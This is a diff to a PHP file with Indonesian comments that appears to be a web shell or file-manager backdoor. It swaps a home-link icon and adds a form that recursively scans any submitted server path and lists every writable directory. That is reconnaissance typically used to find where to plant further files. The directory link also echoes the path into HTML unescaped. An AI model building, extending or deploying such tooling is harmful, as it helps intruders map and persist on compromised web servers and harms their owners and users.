@@ -744,7 +744,7 @@ $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
 $direktori_sekarang = getcwd();
 echo "" . htmlspecialchars($direktori_sekarang);
 ?>
-<b><a href="?dir=<?php echo ($direktori_sekarang); ?>/"> [Home]</a></b>🏠︎
+<b><a href="?dir=<?php echo ($direktori_sekarang); ?>/"> [Home]</a></b>🏚️
 
 <br><br>
 
@@ -1063,6 +1063,70 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 ?>
+
+
+
+
+
+    <form method="POST" action="">
+        <label for="dir">Periksa Direktori Writable:</label>
+        <input type="text" name="dir" id="dir" required placeholder="/path/to/directory">
+        <button type="submit" name="submit">Periksa Direktori</button>
+    </form>
+
+    <pre>
+<?php
+if (isset($_POST['submit'])) {
+    $rootDir = $_POST['dir'];
+
+    function checkWritableDirectories($dir) {
+        // Mengecek apakah path yang diberikan adalah direktori yang valid
+        if (!is_dir($dir)) {
+            return "Path yang diberikan bukan direktori yang valid.";
+        }
+
+        $result = [];
+
+        // Menggunakan RecursiveDirectoryIterator untuk mengakses semua folder dalam direktori
+        $directories = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+
+        // Iterasi melalui semua direktori dan subdirektori
+        foreach ($directories as $directory) {
+            if ($directory->isDir()) {
+                $currentDir = $directory->getPathname();
+
+                // Mengecek apakah direktori dapat ditulis dan menambahkannya ke hasil jika writable
+                if (is_writable($currentDir)) {
+                    $result[] = $currentDir;
+                }
+            }
+        }
+
+        return $result;
+    }
+
+    // Memanggil fungsi pengecekan direktori
+    $writableDirectories = checkWritableDirectories($rootDir);
+
+    // Menampilkan hasil pengecekan
+    if (is_array($writableDirectories)) {
+        if (empty($writableDirectories)) {
+            echo "Tidak ada direktori yang dapat ditulis.";
+        } else {
+            foreach ($writableDirectories as $dir) {
+                echo "Writable Directory: $dir\n";
+            }
+        }
+    } else {
+        echo $writableDirectories; // Menampilkan pesan error jika path tidak valid
+    }
+}
+?>
+    </pre>
+
 
 
 
